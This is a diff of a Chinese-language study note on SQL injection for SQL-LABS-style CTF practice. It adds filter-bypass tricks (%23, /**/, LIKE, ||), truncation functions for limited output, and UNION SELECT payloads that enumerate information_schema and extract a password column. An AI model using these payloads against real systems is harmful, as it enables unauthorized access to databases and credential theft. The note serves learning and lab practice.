@@ -4,6 +4,36 @@
 
 脚本代码在实现代码与数据库进行数据通讯时，将定义的SQL语句进行执行查询数据时。其中的SQL语句能够通过参数传递的自定义的值来实现控制SQL语句，从而执行恶意的SQL语句，可以实现查询其他数据（如数据库中的敏感数据，管理员账号密码等）。
 
+## Tips
+
+### 常用绕过
+
+- #、--+等注释符号
+
+  %23
+
+- 空格
+
+  /**/
+
+- =
+
+  like
+
+- or
+
+  ||
+
+### 回显位数不够
+
+- 使用截断函数进行绕过
+
+  例如group_concat(flag)为输出flag语句，可以使用substr，right，REVERSE，mid进行绕过
+
+  mid举例MID( column_name ,start[,length])
+
+  
+
 ## SQL-LABS
 
 1. 先找到是数字型注入还是字符型注入 并判断闭合符
@@ -68,9 +98,19 @@ union select 1,database(),group_concat(table_name)from information_schema.tables
    union select 1,group_concat(table_name)from information_schema.tables where table_schema='admin114514'--+
    ```
 
+   假设我们获取的表名是fl4g
+
 3. 同上获取列名
 
+   假设我们获取的列名是fllllag
+
 4. 获取指定数据
+
+   假设我们要获取的是列fllllag中的password数据
+
+   ```sql
+   union select 1,password from fl4g.fllllag--+
+   ```
 
    
 
